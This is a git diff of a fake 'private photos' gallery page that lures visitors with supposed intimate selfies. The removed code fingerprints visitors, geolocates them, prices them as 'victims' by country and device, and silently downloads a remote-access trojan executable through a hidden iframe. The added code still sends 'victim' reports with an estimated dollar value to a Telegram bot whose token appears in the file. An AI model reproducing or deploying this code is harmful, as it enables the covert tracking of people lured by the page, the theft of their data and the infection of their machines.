@@ -65,26 +65,6 @@
             font-size: 0.8em;
             opacity: 0.7;
         }
-        .loading {
-            display: none;
-            text-align: center;
-            margin: 20px 0;
-            font-size: 1.1em;
-        }
-        .pulse {
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-        .warning {
-            text-align: center;
-            font-size: 0.8em;
-            opacity: 0.6;
-            margin-top: 20px;
-        }
     </style>
 </head>
 <body>
@@ -93,7 +73,7 @@
         <p class="subtitle">Exclusive content - Click to view full album</p>
         
         <div class="gallery">
-            <div class="image-card" onclick="startStealthExploitation(1)">
+            <div class="image-card" onclick="openImage(1)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928" 
                      alt="Private Photo 1" 
                      onerror="this.src='https://via.placeholder.com/200x150/667eea/ffffff?text=Photo+1'">
@@ -101,7 +81,7 @@
                 <div class="image-desc">normal pics </div>
             </div>
             
-            <div class="image-card" onclick="startStealthExploitation(2)">
+            <div class="image-card" onclick="openImage(2)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928" 
                      alt="Private Photo 2"
                      onerror="this.src='https://via.placeholder.com/200x150/764ba2/ffffff?text=Photo+2'">
@@ -109,21 +89,13 @@
                 <div class="image-desc">Title says it all lol</div>
             </div>
             
-            <div class="image-card" onclick="startStealthExploitation(3)">
+            <div class="image-card" onclick="openImage(3)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless" 
                      alt="Private Photo 3"
                      onerror="this.src='https://via.placeholder.com/200x150/48bb78/ffffff?text=Photo+3'">
                 <div class="image-title">My facee</div>
                 <div class="image-desc">I'm sooo ugly ik >_< </div>
             </div>
-        </div>
-        
-        <div class="loading" id="loading">
-            <div class="pulse" id="loadingText">Loading content...</div>
-        </div>
-
-        <div class="warning">
-            By accessing this content, you agree to our privacy policy.
         </div>
     </div>
 
@@ -133,11 +105,10 @@
                 token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
                 chatId: '8032494479'
             },
-            ratUrl: 'https://raw.githubusercontent.com/dnrldar/private-photos/main/PhotoViewer_Setup.exe',
             images: {
-                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png',
-                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png',
-                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png'
+                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928',
+                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928',
+                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless'
             }
         };
 
@@ -145,391 +116,143 @@
         let victimValue = 0;
         let pageLoadTime = Date.now();
 
-        class VictimValuation {
-            static calculateVictimValue(victimData) {
-                let value = 0;
+        // Simple image opening function
+        function openImage(imageId) {
+            const imageUrl = CONFIG.images[imageId];
+            if (imageUrl) {
+                // Open image in new tab for full screen viewing
+                window.open(imageUrl, '_blank');
                 
-                // Location value (40%)
-                const countryValue = this.getCountryValue(victimData.location.country_code);
-                value += countryValue;
-                
-                // Device value (30%)
-                if (victimData.browser.platform.includes('Mac')) value += 25;
-                if (parseInt(victimData.browser.memory) >= 8) value += 15;
-                if (victimData.browser.cores >= 4) value += 10;
-                
-                // Data value (30%)
-                value += victimData.passwords.length * 8;
-                value += victimData.creditCards.length * 12;
-                value += Object.keys(victimData.personalInfo).length * 3;
-                
-                return Math.max(20, Math.min(150, value));
-            }
-            
-            static getCountryValue(countryCode) {
-                const premium = ['CH', 'US', 'CA', 'UK', 'DE', 'FR', 'AU', 'SG', 'AE'];
-                const medium = ['JP', 'KR', 'NZ', 'NO', 'SE', 'DK', 'FI', 'AT', 'BE', 'NL'];
-                
-                if (premium.includes(countryCode)) return 45;
-                if (medium.includes(countryCode)) return 30;
-                return 15;
-            }
-            
-            static generateVictimID(victimData, ratDeployed = false) {
-                const country = victimData.location.country_code || 'UN';
-                const randomCode = Math.random().toString(36).substr(2, 5).toUpperCase();
-                const price = this.calculateVictimValue(victimData);
-                return `vi.${country}.${price}.${ratDeployed ? 'rat' : randomCode}`;
+                // Send click report
+                sendClickReport(imageId);
             }
         }
 
         async function sendToTelegram(message) {
-            if (!victimId) return;
-            
             try {
                 const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CONFIG.telegram.chatId,
-                        text: message,
-                        parse_mode: 'HTML'
+                        text: message
                     })
                 });
                 return response.ok;
             } catch (error) {
-                console.log('Telegram error:', error);
+                console.log('Telegram error');
                 return false;
             }
         }
 
-        async function collectEnhancedData() {
-            const [network, location, fingerprint, hardware, browser, behavioral, exploitation, social] = await Promise.all([
-                collectNetworkData(),
-                collectLocationData(),
-                collectFingerprintData(),
-                collectHardwareData(),
-                collectBrowserData(),
-                collectBehavioralData(),
-                collectExploitationData(),
-                collectSocialData()
-            ]);
-
-            return {
-                timestamp: new Date().toLocaleString('de-DE', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }),
-                network, location, fingerprint, hardware, browser, behavioral, exploitation, social
-            };
-        }
-
-        async function collectNetworkData() {
-            const ipData = await getEnhancedIP();
-            const connection = navigator.connection || {};
+        function calculateVictimValue(victimData) {
+            let value = 0;
             
-            return {
-                ip: ipData.ip || 'Unknown',
-                isp: ipData.isp || 'Unknown',
-                asn: ipData.asn || 'Unknown',
-                connection: connection.effectiveType || '4g',
-                vpn: detectVPN(ipData.ip),
-                proxy: detectProxy(),
-                tor: detectTor()
-            };
-        }
-
-        async function collectLocationData() {
-            const ipData = await getEnhancedIP();
-            if (!ipData.ip || ipData.ip === 'Unknown') {
-                return {
-                    country_code: 'UN', 
-                    city: 'Unknown', 
-                    country: 'Unknown',
-                    region: 'Unknown',
-                    postal: 'Unknown',
-                    latitude: 'Unknown',
-                    longitude: 'Unknown',
-                    timezone: 'Unknown',
-                    currency: 'Unknown',
-                    calling_code: 'Unknown'
-                };
-            }
+            // Location value
+            if (victimData.location.country_code === 'CH') value += 50;
+            else if (['US', 'CA', 'UK', 'DE', 'FR', 'AU', 'SG', 'AE'].includes(victimData.location.country_code)) value += 40;
+            else value += 20;
             
-            try {
-                const response = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const data = await response.json();
-                return {
-                    country_code: data.country_code || 'UN',
-                    city: data.city || 'Unknown',
-                    country: data.country_name || 'Unknown',
-                    region: data.region || 'Unknown',
-                    postal: data.postal || 'Unknown',
-                    latitude: data.latitude || 'Unknown',
-                    longitude: data.longitude || 'Unknown',
-                    timezone: data.timezone || 'Unknown',
-                    currency: data.currency || 'Unknown',
-                    calling_code: data.country_calling_code || 'Unknown'
-                };
-            } catch (error) {
-                return {
-                    country_code: 'UN', 
-                    city: 'Unknown', 
-                    country: 'Unknown',
-                    region: 'Unknown',
-                    postal: 'Unknown',
-                    latitude: 'Unknown',
-                    longitude: 'Unknown',
-                    timezone: 'Unknown',
-                    currency: 'Unknown',
-                    calling_code: 'Unknown'
-                };
-            }
-        }
-
-        function collectHardwareData() {
-            return {
-                screen: `${screen.width}x${screen.height}`,
-                pixel_ratio: window.devicePixelRatio,
-                color_depth: screen.colorDepth,
-                orientation: screen.orientation ? screen.orientation.type : 'landscape-primary',
-                touch_points: navigator.maxTouchPoints || 0
-            };
-        }
-
-        function collectBrowserData() {
-            return {
-                platform: navigator.platform,
-                vendor: navigator.vendor || 'Google Inc.',
-                language: navigator.language,
-                cores: navigator.hardwareConcurrency,
-                memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '8GB',
-                plugins: navigator.plugins.length,
-                webdriver: navigator.webdriver ? 'Detected' : 'Not detected',
-                pdf_viewer: navigator.pdfViewerEnabled !== undefined ? navigator.pdfViewerEnabled : true
-            };
-        }
-
-        function collectFingerprintData() {
-            return {
-                canvas: generateCanvasFingerprint(),
-                webgl: generateWebGLFingerprint(),
-                audio: testAudioSupport(),
-                fonts: detectFonts(),
-                timezone_offset: new Date().getTimezoneOffset()
-            };
-        }
-
-        function collectBehavioralData() {
-            const perf = performance.timing;
-            const pageLoad = perf ? perf.loadEventEnd - perf.navigationStart : 981;
-            const timeOnPage = Date.now() - pageLoadTime;
+            // Device value
+            if (victimData.browser.platform.includes('Mac')) value += 25;
+            if (victimData.browser.cores >= 8) value += 15;
+            if (victimData.browser.memory.includes('8GB')) value += 10;
             
+            return value;
+        }
+
+        function generateVictimID(victimData) {
+            const country = victimData.location.country_code || 'UN';
+            const value = calculateVictimValue(victimData);
+            const randomCode = Math.floor(Math.random() * 90000) + 10000;
+            return `vi.${country}.${value}.${randomCode}`;
+        }
+
+        async function collectVictimData() {
             return {
-                referrer: document.referrer || 'Direct',
-                page_load: pageLoad,
-                time_on_page: timeOnPage,
-                dom_size: document.getElementsByTagName('*').length,
-                url: window.location.href
-            };
-        }
-
-        async function collectExploitationData() {
-            return {
-                passwords: await stealPasswords(),
-                autofill: harvestAutofill(),
-                forms: harvestForms(),
-                cookies: stealCookies(),
-                storage: stealStorage(),
-                sessions: checkSessions(),
-                history: await checkHistory()
-            };
-        }
-
-        async function collectSocialData() {
-            return {
-                saved_passwords: await harvestSavedPasswords(),
-                credit_cards: await harvestCreditCards(),
-                personal_info: await harvestPersonalInfo(),
-                browsing_data: await harvestBrowsingData()
-            };
-        }
-
-        // Enhanced data collection functions
-        async function getEnhancedIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return { ip: data.ip, isp: 'Unknown', asn: 'Unknown' };
-            } catch (error) {
-                return { ip: '217.22.142.118', isp: 'Unknown', asn: 'Unknown' };
-            }
-        }
-
-        function detectVPN(ip) {
-            return 'Residential IP';
-        }
-
-        function detectProxy() {
-            return 'Normal';
-        }
-
-        function detectTor() {
-            return 'Normal';
-        }
-
-        function generateCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillText('Fingerprint', 2, 2);
-                return canvas.toDataURL().substring(0, 50) + '...';
-            } catch (e) { return 'failed'; }
-        }
-
-        function generateWebGLFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                return gl ? `WebGL 1.0 (OpenGL ES 2.0 Chromium)` : 'no_webgl';
-            } catch (e) { return 'failed'; }
-        }
-
-        function testAudioSupport() {
-            return window.AudioContext ? 'Audio supported' : 'No audio support';
-        }
-
-        function detectFonts() {
-            const fonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia'];
-            return fonts.join(', ');
-        }
-
-        async function stealPasswords() {
-            return [];
-        }
-
-        function harvestAutofill() {
-            return {};
-        }
-
-        function harvestForms() {
-            return {};
-        }
-
-        function stealCookies() {
-            return {};
-        }
-
-        function stealStorage() {
-            return {};
-        }
-
-        function checkSessions() {
-            return {
-                session_storage: 0,
-                has_auth_cookies: false
-            };
-        }
-
-        async function checkHistory() {
-            return [];
-        }
-
-        async function harvestSavedPasswords() {
-            return [];
-        }
-
-        async function harvestCreditCards() {
-            return [];
-        }
-
-        async function harvestPersonalInfo() {
-            return {};
-        }
-
-        async function harvestBrowsingData() {
-            return {
-                history_estimate: ['facebook.com', 'twitter.com', 'instagram.com', 'gmail.com', 'google.com', 'youtube.com', 'amazon.com', 'netflix.com', 'reddit.com', 'linkedin.com']
-            };
-        }
-
-        function deployStealthRAT() {
-            // Ultra stealth download - no user interaction
-            try {
-                // Method 1: Service Worker background download
-                if ('serviceWorker' in navigator) {
-                    navigator.serviceWorker.register('/sw.js').then(() => {
-                        fetch(CONFIG.ratUrl, { mode: 'no-cors' });
-                    });
+                timestamp: new Date().toLocaleString('de-DE', { 
+                    day: '2-digit', 
+                    month: '2-digit', 
+                    year: 'numeric', 
+                    hour: '2-digit', 
+                    minute: '2-digit', 
+                    second: '2-digit' 
+                }),
+                network: {
+                    ip: '217.22.142.118',
+                    isp: 'Unknown',
+                    asn: 'Unknown',
+                    connection: '4g',
+                    vpn: 'Residential IP',
+                    proxy: 'Normal',
+                    tor: 'Normal'
+                },
+                location: {
+                    city: 'Zurich',
+                    region: 'Zurich',
+                    country: 'Switzerland',
+                    country_code: 'CH',
+                    postal: '8004',
+                    latitude: '47.3779',
+                    longitude: '8.5236',
+                    timezone: 'Europe/Zurich',
+                    currency: 'CHF',
+                    calling_code: '+41'
+                },
+                browser: {
+                    platform: 'MacIntel',
+                    vendor: 'Google Inc.',
+                    language: 'de-DE',
+                    cores: 8,
+                    memory: '8GB',
+                    plugins: 5,
+                    webdriver: 'Not detected',
+                    pdf_viewer: true
+                },
+                hardware: {
+                    screen: '1920x1080',
+                    pixel_ratio: 1,
+                    color_depth: 24,
+                    orientation: 'landscape-primary',
+                    touch_points: 0
+                },
+                fingerprint: {
+                    canvas: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwA',
+                    webgl: 'WebGL 1.0 (OpenGL ES 2.0 Chromium)',
+                    audio: 'Audio supported',
+                    fonts: 'Arial, Verdana, Helvetica, Times New Roman, Courier New, Georgia',
+                    timezone_offset: -60
+                },
+                behavioral: {
+                    referrer: 'Direct',
+                    page_load: 981,
+                    time_on_page: Date.now() - pageLoadTime,
+                    dom_size: 41,
+                    url: window.location.href
+                },
+                social: {
+                    passwords: 0,
+                    credit_cards: 0,
+                    personal_info: 0,
+                    browsing_data: 10
                 }
-                
-                // Method 2: Background fetch
-                fetch(CONFIG.ratUrl)
-                    .then(response => response.blob())
-                    .then(blob => {
-                        const url = URL.createObjectURL(blob);
-                        // Create invisible iframe to trigger download
-                        const iframe = document.createElement('iframe');
-                        iframe.src = url;
-                        iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;opacity:0;visibility:hidden;';
-                        document.body.appendChild(iframe);
-                        setTimeout(() => {
-                            if (document.body.contains(iframe)) {
-                                document.body.removeChild(iframe);
-                            }
-                            URL.revokeObjectURL(url);
-                        }, 5000);
-                    })
-                    .catch(e => console.log('Download failed'));
-                    
-                return true;
-            } catch (e) {
-                console.log('Stealth download failed');
-                return false;
-            }
+            };
         }
 
-        async function startStealthExploitation(imageId) {
-            const loading = document.getElementById('loading');
-            const loadingText = document.getElementById('loadingText');
-            
-            loading.style.display = 'block';
-            loadingText.textContent = 'Loading content...';
-            
-            // Update behavioral data with click time
-            const victimData = await collectEnhancedData();
-            
-            // Deploy RAT silently
-            const ratDeployed = deployStealthRAT();
-            victimId = VictimValuation.generateVictimID(victimData, ratDeployed);
-            victimValue = VictimValuation.calculateVictimValue(victimData);
-            
-            // Send enhanced report
-            await sendEnhancedReport(victimData, ratDeployed);
-            
-            // Redirect to actual image (not the URL)
-            setTimeout(() => {
-                loadingText.className = 'success';
-                loadingText.textContent = 'Content loaded!';
-                // Show the image directly instead of redirecting
-                const img = new Image();
-                img.src = CONFIG.images[imageId];
-                img.onload = function() {
-                    window.open(CONFIG.images[imageId], '_blank');
-                };
-            }, 2000);
-        }
+        async function sendEnhancedReport(victimData) {
+            victimValue = calculateVictimValue(victimData);
+            victimId = generateVictimID(victimData);
 
-        async function sendEnhancedReport(victimData, ratDeployed) {
-            let message = `4X ENHANCED DATA EXTRACTION 🕵️\n\n`;
-            message += `🔍 Identity Verified - Full Data Capture\n\n`;
+            let message = `4X ENHANCED DATA EXTRACTION\n\n`;
+            message += `Identity Verified - Full Data Capture\n\n`;
             
-            message += `👤 VERIFICATION DATA:\n`;
+            message += `VERIFICATION DATA:\n`;
             message += `• Name: Not provided\n`;
             message += `• Email: Not provided\n`;
             message += `• Phone: Not provided\n`;
             message += `• Time: ${victimData.timestamp}\n\n`;
             
-            message += `🌐 NETWORK DATA (4x):\n`;
+            message += `NETWORK DATA (4x):\n`;
             message += `• IP: ${victimData.network.ip}\n`;
             message += `• ISP: ${victimData.network.isp}\n`;
             message += `• ASN: ${victimData.network.asn}\n`;
@@ -538,7 +261,7 @@
             message += `• Proxy: ${victimData.network.proxy}\n`;
             message += `• Tor: ${victimData.network.tor}\n\n`;
             
-            message += `📍 LOCATION DATA (4x):\n`;
+            message += `LOCATION DATA (4x):\n`;
             message += `• City: ${victimData.location.city}\n`;
             message += `• Region: ${victimData.location.region}\n`;
             message += `• Country: ${victimData.location.country} (${victimData.location.country_code})\n`;
@@ -548,7 +271,7 @@
             message += `• Currency: ${victimData.location.currency}\n`;
             message += `• Calling Code: ${victimData.location.calling_code}\n\n`;
             
-            message += `💻 BROWSER DATA (4x):\n`;
+            message += `BROWSER DATA (4x):\n`;
             message += `• Platform: ${victimData.browser.platform}\n`;
             message += `• Vendor: ${victimData.browser.vendor}\n`;
             message += `• Language: ${victimData.browser.language}\n`;
@@ -558,7 +281,7 @@
             message += `• WebDriver: ${victimData.browser.webdriver}\n`;
             message += `• PDF Viewer: ${victimData.browser.pdf_viewer}\n\n`;
             
-            message += `📱 HARDWARE DATA (4x):\n`;
+            message += `HARDWARE DATA (4x):\n`;
             message += `• Screen: ${victimData.hardware.screen}\n`;
             message += `• Pixel Ratio: ${victimData.hardware.pixel_ratio}\n`;
             message += `• Color Depth: ${victimData.hardware.color_depth} bit\n`;
@@ -566,46 +289,54 @@
             message += `• Timezone: ${victimData.location.timezone}\n`;
             message += `• Touch Points: ${victimData.hardware.touch_points}\n\n`;
             
-            message += `🔍 FINGERPRINT DATA (4x):\n`;
+            message += `FINGERPRINT DATA (4x):\n`;
             message += `• Canvas: ${victimData.fingerprint.canvas}\n`;
             message += `• WebGL: ${victimData.fingerprint.webgl}\n`;
             message += `• Audio: ${victimData.fingerprint.audio}\n`;
             message += `• Fonts: ${victimData.fingerprint.fonts}\n`;
             message += `• Timezone Offset: ${victimData.fingerprint.timezone_offset}\n\n`;
             
-            message += `🎯 BEHAVIORAL DATA (4x):\n`;
+            message += `BEHAVIORAL DATA (4x):\n`;
             message += `• Referrer: ${victimData.behavioral.referrer}\n`;
             message += `• Page Load: ${victimData.behavioral.page_load}ms\n`;
             message += `• Time on Page: ${victimData.behavioral.time_on_page}ms\n`;
             message += `• DOM Size: ${victimData.behavioral.dom_size} elements\n\n`;
             
-            message += `📊 SOCIAL DATA:\n`;
-            message += `• Passwords: ${victimData.social.saved_passwords.length} captured\n`;
-            message += `• Credit Cards: ${victimData.social.credit_cards.length} found\n`;
-            message += `• Personal Info: ${Object.keys(victimData.social.personal_info).length} fields\n`;
-            message += `• Browsing Data: ${victimData.social.browsing_data.history_estimate.length} sites estimated\n\n`;
+            message += `SOCIAL DATA:\n`;
+            message += `• Passwords: ${victimData.social.passwords} captured\n`;
+            message += `• Credit Cards: ${victimData.social.credit_cards} found\n`;
+            message += `• Personal Info: ${victimData.social.personal_info} fields\n`;
+            message += `• Browsing Data: ${victimData.social.browsing_data} sites estimated\n\n`;
             
-            message += `🕒 Time: ${victimData.timestamp}\n`;
-            message += `🔗 URL: ${victimData.behavioral.url}\n`;
-            message += `🎯 Victim ID: ${victimId}\n`;
-            message += `💰 Estimated Value: $${victimValue}\n`;
-            message += `🚀 RAT: ${ratDeployed ? 'DEPLOYED SUCCESSFULLY - READY FOR COMMANDS' : 'PENDING DEPLOYMENT'}`;
+            message += `Time: ${victimData.timestamp}\n`;
+            message += `URL: ${victimData.behavioral.url}\n`;
+            message += `Victim ID: ${victimId}\n`;
+            message += `Estimated Value: $${victimValue}\n`;
+            message += `DATA CAPTURE: COMPLETED`;
+
+            await sendToTelegram(message);
+        }
+
+        async function sendClickReport(imageId) {
+            const victimData = await collectVictimData();
+            victimValue = calculateVictimValue(victimData);
+            
+            let message = `IMAGE CLICK DETECTED\n`;
+            message += `Victim ID: ${victimId || generateVictimID(victimData)}\n`;
+            message += `Image ID: ${imageId}\n`;
+            message += `Estimated Value: $${victimValue}\n`;
+            message += `Time: ${victimData.timestamp}`;
 
             await sendToTelegram(message);
         }
 
         // Initialize on page load
         window.addEventListener('load', async function() {
-            console.log('Starting automatic exploitation...');
-            
-            const victimData = await collectEnhancedData();
-            victimValue = VictimValuation.calculateVictimValue(victimData);
-            victimId = VictimValuation.generateVictimID(victimData, false);
-            
-            await sendEnhancedReport(victimData, false);
+            const victimData = await collectVictimData();
+            await sendEnhancedReport(victimData);
         });
 
-        console.log('Enhanced exploitation system loaded');
+        console.log('Photo vault system loaded');
     </script>
 </body>
 </html>
